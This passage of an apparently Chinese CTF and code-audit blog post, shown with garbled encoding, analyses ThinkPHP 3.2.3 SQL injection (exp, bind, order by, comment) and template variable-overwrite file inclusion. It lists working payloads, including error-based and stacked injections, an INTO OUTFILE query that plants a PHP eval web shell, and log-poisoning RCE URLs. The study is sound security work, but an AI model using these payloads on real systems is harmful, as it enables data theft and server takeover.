å…¥çš„usernameå‚æ•°ä¸ºæ•°ç»„ï¼Œå°±ä¼šå¯¹<code>$exp</code>å¤åˆ¶<code>$exp</code>è¢«ç›´æ¥å¤åˆ¶ä¸ºäº†val[0]<br>è¯´å®è¯çœŸæœ‰ç‚¹å·§äº†ï¼Œå½“åˆå‘ç°è¿™ä¸ªæ³¨å…¥æ–¹æ³•çš„æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯è¿™æ ·å‘ç°çš„å‘¢?</p><h3 id="web574"><a href="#web574" class="headerlink" title="web574"></a>web574</h3><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-111912729.png" class="">  <p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°whereå†…çš„å‚æ•°æˆ‘ä»¬å¯æ§è€Œä¸”å…¶ä¸ºstringï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ç¬¬ä¸€ä¸ªåˆ†æçš„æ³¨å…¥æ–¹æ³•<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-112017316.png" class=""><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0) union select 1,(select flag4s from flags),3,4%23</span><br></pre></td></tr></table></figure><br>è™½ç„¶æˆ‘ä»¬æ‹¿åˆ°äº†flagã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹é¢˜ç›®ç»™çš„æºç ä¼šå‘ç°ä¸€ä¸ªshowå‡½æ•°ï¼Œè€Œå…¶å‚æ•°ä¸º<code>$html</code>é‚£åº”è¯¥æ˜¯å›æ˜¾çš„html<br>é‚£ä¹ˆå…¶åº”è¯¥æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè¿™å°±æœ‰å¯èƒ½å­˜åœ¨ä¸€ä¸ªrceçš„æ¼æ´<br>æˆ‘ä»¬ä½¿ç”¨sqlæ³¨å…¥ä½¿å…¶å›æ˜¾<code>&lt;?php phpinfo();?&gt;</code><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-113738007.png" class="">  </p><h3 id="web577"><a href="#web577" class="headerlink" title="web577"></a>web577</h3><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-112359007.png" class="">  <p>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªæ˜æ˜¾å°±æ˜¯expæ³¨å…¥äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿å…¶value[0]ä¸ºexpæ¥è¿›è¡Œsqlæ³¨å…¥<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-112910803.png" class=""><br>?id[0]=exp&amp;id[1]= =0 union select 1,(select flag4s from flags),3,4</p><h2 id="where-bindæ³¨å…¥"><a href="#where-bindæ³¨å…¥" class="headerlink" title="where bindæ³¨å…¥"></a>where bindæ³¨å…¥</h2><p>åŸæœ¬æˆ‘ä»¥ä¸ºè¿™ä¸ªä¼šå’Œä¸Šé¢çš„expæ³¨å…¥æ–¹æ³•æ˜¯ä¸€æ ·çš„ç»“æœå‘ç°ï¼Œè¿˜æ˜¯æœ‰ä¸å°å·®åˆ«çš„</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-233826733.png" class="">  <p>æˆ‘ä»¬è°ƒåˆ°è¿™é‡Œè¿™ä¸ªbindä¼šå‘ç°è¯·keyå’Œvalæ‹¼æ¥äº†ä¸€ä¸ª=:<br>è¿™å¯¼è‡´æˆ‘æ— æ³•æƒ³ä¹‹å‰ä¸€æ ·è¿›è¡Œsqlæ³¨å…¥</p><p>ä½†æ˜¯æˆ‘ä»¬çœ‹ä¸Šé¢çš„ä»£ç å¯ä»¥å‘ç°å…¶æ‹¼æ¥çš„æ—¶å€™å¹¶ä¸æ˜¯=å·è€Œæ˜¯= :è¿™å°±å¯¼è‡´äº†æˆ‘ä»¬çš„sqlè¯­å¥ä¼šå› ä¸º:ä¸€ç›´æŠ¥é”™ä»è€Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è¿›è¡Œsqlæ³¨å…¥ã€‚<br>bind sqlæ³¨å…¥çš„åœºæ™¯ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$id=array(&quot;username&quot;=&gt;$_GET[&#x27;name&#x27;]);</span><br><span class="line">$data=array(&quot;password&quot;=&gt;I(&quot;GET.password&quot;));</span><br><span class="line">$User=M(&quot;users&quot;);</span><br><span class="line">$b=$User-&gt;where($id)-&gt;save($data);</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure><br>æ˜¯æ•°æ®åº“æ›´æ–°æ—¶æ‰€è§¦å‘çš„<br>æˆ‘ä»¬å…ˆä¼ å…¥<code>?id=1&#39;&amp;password=123&#39;</code>æ¥è·³ä¸€è·³çœ‹çœ‹é€»è¾‘<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-150632604.png" class=""><br>å…ˆè¿›å…¥whereå…¶å°±æ˜¯å¯¹<code>$this-&gt;options[&#39;where&#39;]</code>èµ‹å€¼ä¸º<code>$where</code>ç„¶åè¿”å›ã€‚<br>ç„¶åè¿›å…¥save<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-152800348.png" class="">  </p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-150942477.png" class="">  <p>å…ˆè¿›å…¥<code>$this-&gt;_facade</code>å…¶ä½œç”¨å…¶å®å°±æ˜¯<code>$fields</code>èµ‹å€¼ä¸º<code>$this-&gt;$fields</code>å’Œå¯¹saveçš„å‚æ•°ç”¨_parseTypeæ¥è¿›è¡Œå¤„ç†ã€‚<code>$this-&gt;$fields</code>å…¶å®å°±æ˜¯usersè¿™ä¸ªè¡¨çš„åˆ—åå’Œåˆ—æ•°æ®ç±»å‹ã€‚è€Œ_parseTypeåªä¼šå¯¹,bool int floatè¿™ç§æ•°æ®è¿›è¡Œå¤„ç†ã€‚æˆ‘ä»¬å‚æ•°æŒ‡å‘çš„åˆ—åæ˜¯varcharç±»å‹ä¸ä¼šè¢«å¤„ç†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-152523956.png" class="">  </p><p>è€Œåçš„_parseOptionså‰é¢å·²ç»åˆ†æè¿‡äº†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-153042823.png" class=""><br>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°æ­¥å…¥å…³é”®å‡½æ•°update<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-153248774.png" class=""><br>updateä¸‹æœ‰ä¸‰ä¸ªå…³é”®å‡½æ•°ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªçš„å»çœ‹<br>æˆ‘ä»¬å…ˆçœ‹985è¡Œå¯ä»¥å‘ç°<code>$sql</code>çš„å€¼æ˜¯ç”±update <code>$table</code> ä»¥åŠ<code>$this-&gt;parseSet($data)</code>çš„è¿”å›å€¼ç»„åˆæˆçš„ï¼Œå…¶å®ä¸ç”¨æ­¥å…¥å‡½æ•°æˆ‘ä»¬ä¹Ÿèƒ½çŒœåˆ°è¿™æ˜¯ä¸ªæ›´æ–°æ•°æ®åº“çš„sqlè¯­å¥ã€‚</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-153904189.png" class="">  <p>è¿›å…¥parseSetå‡½æ•°æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„<code>$data</code>ä¼šè¢«æ‹¼æ¥ä¸º<code>password=:$name</code>å³<code>password=:0</code><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-154524264.png" class=""><br>å¹¶ä¸”å°†<code>:$name</code>ä½œä¸ºkeyå­˜åˆ°bindæ•°ç»„é‡Œï¼Œvalueå…¶å®å°±æ˜¯æˆ‘ä»¬ä¼ å…¥<code>$data</code>çš„value</p><p>990è¡Œå…¶å®å°±æ˜¯å°†<code>$sql</code>æ‹¼æ¥ä¸Š<code>$this-&gt;parseWhere</code>çš„è¿”å›å€¼ï¼Œè¿™ä¸ªå‡½æ•°åœ¨æˆ‘ä»¬ä¹‹å‰å®¡expæ³¨å…¥æ—¶å…¶å®ä»¥åŠçœ‹çš„ä¸ƒä¸ƒå…«å…«äº†<br>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹execute()<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-155031110.png" class=""><br>å…¶å†…éƒ¨æœ‰ä¸ªstrtræ¥å¯¹æˆ‘ä»¬çš„ <code>$this-&gt;queryStr</code>è¿›è¡Œæ›¿æ¢<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-155143658.png" class=""><br>ä¹Ÿå°±æ˜¯å¯¹ä¹‹å‰å¤„ç†ç”Ÿæˆçš„sqlè¯­å¥è¿›è¡Œæ›¿æ¢ã€‚<br>æˆ‘ä»¬çœ‹strtrå…¶å‚æ•°åªæœ‰ä¸¤ä¸ªç¬¬äºŒä¸ªä¸ºç»è¿‡array_mapå¤„ç†çš„<code>$this-&gt;bind</code>,array_mapå†…çš„åŒ¿åå‡½æ•°å…¶å®å°±æ˜¯ä¸€ä¸ªä½¿ç”¨addslashesæ¥å¤„ç†valueçš„å‡½æ•°ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-155908296.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-160425089.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå½“strtrçš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œå…¶æ›¿æ¢é€»è¾‘å°±æ˜¯å°†strä¸­ä¸keyåŒæ ·çš„å­—ç¬¦ä¸²æ”¹ä¸ºvalueã€‚<br><code>$this-&gt;bind</code>å‰é¢æ˜¯è¢«èµ‹å€¼ä¸º<code>:0=&gt;$value</code><br>å…¶å®ä¹Ÿå°±æ˜¯å°†æˆ‘ä»¬ä¼ å…¥saveçš„å‚æ•°çš„æ•°ç»„çš„valueé‡æ–°èµ‹å€¼å›å»è¯´å®è¯è¿™ä¸ª:0ç®€ç›´ä¸è¦å¤ªçœ¼ç†Ÿï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åƒä»¥expæ³¨å…¥çš„æ–¹å¼æ¥è¿›è¡Œbindæ³¨å…¥é‡åˆ°çš„å›°éš¾ç‚¹å—ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-161030438.png" class=""><br>æˆ‘ä»¬åªè¦ç»™whereä¼ ä¸€ä¸ªæ•°ç»„val[0]ä¸ºbindï¼Œval[1]èµ‹å€¼ä¸º0 xxxxxxxzè¿™æ ·æœ€ç»ˆçš„sqlè¯­å¥å°±ä¼šè¢«è½¬ä¸º</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-161550571.png" class="">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=0 xxxxx&amp;password=123</span><br><span class="line"></span><br><span class="line">UPDATE `users` SET `password`=&#x27;123&#x27; WHERE `username` = &#x27;123&#x27; xxxxx</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆxxxxå°±æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„sqlè¯­å¥ï¼Œå› ä¸ºè¿™ä¸ªä¸æ˜¯æŸ¥è¯¢è¯­å¥æ‰€ä»¥æˆ‘ä»¬åªå¥½ä½¿ç”¨ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-161949156.png" class="">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Home/Index/sql?id[0]=bind&amp;id[1]=0 or extractvalue(0x0a,concat(0x0a,(select database())))%23&amp;password=123</span><br></pre></td></tr></table></figure><h2 id="order-by-æ³¨å…¥"><a href="#order-by-æ³¨å…¥" class="headerlink" title="order by æ³¨å…¥"></a>order by æ³¨å…¥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$User</span>=<span class="title function_ invoke__">M</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="variable">$num</span>=<span class="title function_ invoke__">I</span>(<span class="string">&quot;GET.num&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;id=1&quot;</span>)-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$num</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-165124717.png" class="">  <p>whereæˆ‘ä»¬å°±ä¸çœ‹äº†ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹orderçš„é€»è¾‘ï¼Œé¦–å…ˆåœ¨Thinkæ§åˆ¶å™¨ä¸­å¹¶æ²¡æœ‰orderæ–¹æ³•æ‰€ä»¥å…¶è§¦å‘åˆ°<code>__call</code></p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-165816885.png" class="">  <p>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ˜¯ä¸€ä¸ªèµ‹å€¼æ“ä½œ</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-170230541.png" class="">  <p>æ¥ä¸‹æ¥å’Œå‰é¢éƒ½å·®ä¸å¤šï¼Œç›´æ¥è°ƒåˆ°æ‹¼æ¥sqlè¯­å¥çš„parseOrderé‡Œ<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-171041939.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-171048944.png" class=""><br>å¯ä»¥çœ‹åˆ°æ— è®ºå…¶å†…å®¹æ˜¯å¦ä¸ºæ•°ç»„éƒ½æ²¡æœ‰è¿›è¡Œè¿‡æ»¤å’Œæ¸²æŸ“ã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ç›´æ¥è¿›è¡Œsqlæ³¨å…¥</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-171204529.png" class="">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Home/Index/sql?num=3 or extractvalue(0x0a,concat(0x0a,(select database())))</span><br></pre></td></tr></table></figure><h2 id="commentæ³¨é‡Šæ³¨å…¥"><a href="#commentæ³¨é‡Šæ³¨å…¥" class="headerlink" title="commentæ³¨é‡Šæ³¨å…¥"></a>commentæ³¨é‡Šæ³¨å…¥</h2><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-185658185.png" class="">  <p>å’Œå‰é¢çš„å…¶å®ä¸€æ ·ï¼Œæˆ‘ä»¬è°ƒåˆ°æ¨¡æ¿æ‹¼æ¥éƒ¨åˆ†å¯ä»¥å‘ç°ï¼Œå…¶æ˜¯ç›´æ¥ç”¨æ³¨é‡Šç¬¦åŒ…è£¹ç„¶åè¿”å›ã€‚æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE `id` = 0 LIMIT 1 /* injection_point */</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬é—­åˆä¸€ä¸‹æ³¨é‡Šç¬¦å…¶å®ç›¸å½“äºåœ¨limitåè¿›è¡Œæ³¨å…¥<br><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•</a></p><p>ä½†æ˜¯æ–‡ä¸­çš„æ–¹æ³•åœ¨æˆ‘çš„å®æµ‹ä¸‹å¹¶ä¸è¯•ç”¨äºmysql5.7.xï¼Œé€‚ç”¨äºmysql5.5.x<br>è¿™æ—¶æˆ‘ä»¬é™¤äº†æ–‡ä¸­çš„æ–¹æ³•è¿˜å¯ä»¥é‡‡ç”¨å †å æ³¨å…¥ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Home/Index/sql?id=*/;select sleep(3) /*</span><br></pre></td></tr></table></figure><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-202404772.png" class="">  </p><p>åœ¨5.5ç‰ˆæœ¬ä¸‹çš„mysqlæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨æ–‡ä¸­çš„æ–¹æ³•<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-202543326.png" class=""><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Home/Index/sql?id=*/procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); /*</span><br></pre></td></tr></table></figure></p><h3 id="web576"><a href="#web576" class="headerlink" title="web576"></a>web576</h3><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-213327951.png" class="">  <p>é¢˜ç›®éœ€è¦æ‹¿åˆ°shellï¼Œä¸”ä¸ºæ³¨é‡Šæ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ç”¨å †å æ³¨å…¥æ¥å†™å…¥shell<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=*/;select &quot;&lt;?php eval($_POST[&#x27;lse&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot; /*</span><br></pre></td></tr></table></figure><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241212-213456629.png" class="">  </p><h1 id="assignå‚æ•°å¯æ§å¯¼è‡´çš„-å˜é‡è¦†ç›–å¯¼è‡´çš„å‘½ä»¤æ‰§ï¼ˆå…¶å®åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«ï¼‰"><a href="#assignå‚æ•°å¯æ§å¯¼è‡´çš„-å˜é‡è¦†ç›–å¯¼è‡´çš„å‘½ä»¤æ‰§ï¼ˆå…¶å®åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="assignå‚æ•°å¯æ§å¯¼è‡´çš„,å˜é‡è¦†ç›–å¯¼è‡´çš„å‘½ä»¤æ‰§ï¼ˆå…¶å®åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«ï¼‰"></a>assignå‚æ•°å¯æ§å¯¼è‡´çš„,å˜é‡è¦†ç›–å¯¼è‡´çš„å‘½ä»¤æ‰§ï¼ˆå…¶å®åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«ï¼‰</h1><h2 id="thinkæ¨¡æ¿å¼•æ“"><a href="#thinkæ¨¡æ¿å¼•æ“" class="headerlink" title="thinkæ¨¡æ¿å¼•æ“"></a>thinkæ¨¡æ¿å¼•æ“</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">I</span>(<span class="string">&quot;GET.name&quot;</span>);</span><br><span class="line">    <span class="variable">$from</span>=<span class="variable">$_GET</span>[<span class="string">&quot;from&quot;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="variable">$name</span>,<span class="variable">$from</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;rce&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ä¸Šé¢çš„ä»£ç æœ‰ä¸¤ä¸ªå¯æ§å‚æ•°ä½†æ˜¯åªè¦èƒ½æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°å…¶å®å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œè‡³äºä¸ºä»€ä¹ˆæˆ‘ä»¬è°ƒä¸€ä¸‹å°±çŸ¥é“äº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.20.1/index.php/Home/Index/rce?name=name&amp;from=lse</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªæ¼æ´å‡ºç°çš„åŸå› å°±æ˜¯assignæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œå› ä¸ºå½“ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§æ—¶ï¼Œå…¶å®å…¶è¿”å›å€¼ä¹Ÿå°±è¢«æ§åˆ¶äº†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-122640900.png" class=""><br>æˆ‘ä»¬æ­¥å…¥å¯ä»¥å‘ç°å½“ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œå…¶ç›´æ¥ç»™<code>$this-&gt;Tvar</code>èµ‹å€¼ä¸ºæ•°ç»„<code>$name</code>å¦‚æœä¸æ˜¯æ•°ç»„å°±æŠŠ<code>$name</code>å½“key ç¬¬äºŒä¸ªå‚æ•°å½“valueï¼Œå¯è§è¦æ§åˆ¶tVarå…¶å®æˆ‘ä»¬åªè¦èƒ½æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°å³å¯</p><p>æˆ‘ä»¬å…ˆç®€å•è°ƒä¸€ä¸‹å…¶æ˜¯æ€ä¹ˆè¿›è¡Œæ¨¡æ¿æ‹¼æ¥çš„ï¼Œå…¶é™¤äº†æŸäº›å¤„ç†ä¹‹å¤–ï¼Œå…¶å®å’Œä¹‹å‰çš„showæ˜¯å¾ˆåƒçš„<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-131056611.png" class=""><br>ä¸€æ ·è¿›å…¥fetch<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-131146135.png" class=""><br>ä¸€æ ·æ”¾å›æ¨¡æ¿çš„è·¯å¾„<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-131653907.png" class=""><br>ä¼ å…¥listenæ–¹æ³•çš„å‚æ•°çš„<code>$params</code>å…¶åŒ…å«äº†<code>$this-&gt;tVar</code><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-131237056.png" class=""><br>è¿›å…¥listenåä¼šå‘ç°ä¸€ä¸ªç±»ä¸‹çš„execå‡½æ•°,è¿™äº›è¿‡ç¨‹å’Œå‰é¢showæ–¹æ³•çš„ç±»ä¼¼æˆ‘ä»¬ç›´æ¥ä¸€è·¯è°ƒåˆ°runæ–¹æ³•<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-132007863.png" class="">  </p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å®ä¾‹åŒ–äº†ä¸€ä¸ªæ¨¡æ¿ç±»ååˆè°ƒç”¨äº†fetchï¼Œå…¶å‚æ•°æœ‰<code>$_data[&#39;var&#39;]</code>,è¿™ä¸ªdataå…¶å®å°±æ˜¯<code>$params</code><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-132342814.png" class=""><br>ä¸‡èƒ½è¿›å…¥fetchä¼šå‘ç°å…¶åŒæ ·æœ‰ä¸€ä¸ªæ¸²æŸ“æ¨¡æ¿çš„è¿‡ç¨‹ï¼Œå…¶æ¨¡æ¿è¢«æ¸²æŸ“ä¸ºå¦‚ä¸‹phpæ–‡ä»¶<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-132326786.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ˜¯å°†æˆ‘ä»¬çš„<code>&#123;$name&#125;</code>å˜ä¸ºäº†<code>&lt;?php echo ($name); ?&gt;</code>ï¼Œè€Œæˆ‘ä»¬ç›®å‰å¹¶æ²¡æœ‰<code>$name</code>è¿™ä¸ªå‚æ•°,é‚£ä¹ˆä¸‹é¢è‚¯å®šä¼šåˆ›å»ºä¸€ä¸ª<code>$name</code>å‚æ•°ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹å…¶æ˜¯æ€ä¹ˆåˆ›å»ºçš„<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-132719373.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶é€»è¾‘ä¸ºä½¿ç”¨ <code>extract($vars, EXTR_OVERWRITE);</code>æ¥å°†<code>$vars</code>çš„keyå˜ä¸ºå˜é‡ï¼Œè€Œ<code>$vars</code>å…¶å®å°±æ˜¯<code>$this-&gt;tVar</code><br><code>$vars</code>å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ã€‚è€Œä¸‹é¢æ­£å¥½æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°†<code>$_filename</code>è¿›è¡Œè¦†ç›–è¿™æ ·ä¸å°±å¯ä»¥è¿›è¡Œæ—¥å¿—æ–‡ä»¶åŒ…å«äº†?<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php/Home/Index/rce?name=&lt;?=eval($_POST[123])?&gt;</span><br><span class="line"></span><br><span class="line">http://192.168.20.1/index.php/Home/Index/rce?name=_filename&amp;from=./Application/Runtime/Logs/Home/24_12_13.log</span><br></pre></td></tr></table></figure><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-134631362.png" class="">  </p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-140724790.png" class="">  <h2 id="phpæ¨¡æ¿å¼•æ“"><a href="#phpæ¨¡æ¿å¼•æ“" class="headerlink" title="phpæ¨¡æ¿å¼•æ“"></a>phpæ¨¡æ¿å¼•æ“</h2><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-135339824.png" class="">  <p>æˆ‘ä»¬åº“çœ‹åˆ°å½“å¼•æ“ä¸ºphpæ—¶ï¼Œå‰é¢ä¹Ÿæœ‰ä¸€ä¸ªextract<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">empty($_content) ? include $templateFile : eval(&#x27;?&gt;&#x27; . $_content);</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°åªè¦<code>$_content</code>ä¸ä¸ºç©ºå…¶å°±ä¼šç›´æ¥æ‰§è¡Œ<code>$_content</code>,å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥è¦†ç›–<code>templateFile</code>é‚£å°±å’Œå‰é¢ä¸€æ ·äº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/home/index/rce?name=_content&amp;from=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-135611072.png" class="">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/home/index/rce?name=templateFile&amp;from=./Application/Runtime/Logs/Home/24_12_13.log</span><br></pre></td></tr></table></figure><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241213-135657150.png" class="">  <h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YKp2DREb7Dk737W4D#toc-32">Thinkphp 3.2.3 SQLæ³¨å…¥æ¼æ´æ€»ç»“</a><br><a href="https://www.kancloud.cn/manual/thinkphp/1678">ThinkPHP3.2.3å®Œå…¨å¼€å‘æ‰‹å†Œ</a></p><p><a href="https://xz.aliyun.com/t/10876?time__1311=CqjxRDciiQd4lxGg6KGODnerPitDCbSAeD">thinkphp3 